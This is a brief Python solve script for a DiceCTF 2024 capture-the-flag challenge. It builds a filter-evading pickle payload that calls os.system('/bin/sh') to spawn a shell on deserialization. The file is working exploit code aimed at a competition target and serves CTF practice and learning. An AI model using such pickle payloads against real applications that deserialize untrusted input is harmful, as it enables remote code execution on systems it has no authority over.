# Challenge: https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/misc/unipickle


import pickle
import pickaxe


s1 = "os"
s2 = "system"
s3 = "/bin/sh"

crafter = pickaxe.UnicodeCrafter(forbidden_bytes=[b" ", b"\n"])
crafter.import_from(s1, s2)

crafter.mark()
crafter.push(s3)
crafter.call_f(1, use_mark=True)

# If the payload is not valid UTF-8, this raises UnicodeDecodeError
# instead of ValueError from crafter.get_payload().
check_f = lambda x: len(x.decode("utf-8").split()) == 1


try:
    payload = crafter.loads(check_function=check_f)
    # Spawn a shell.
except Exception as ex:
    print("failed to build payload:", crafter.get_payload(check_stop=True), ex)
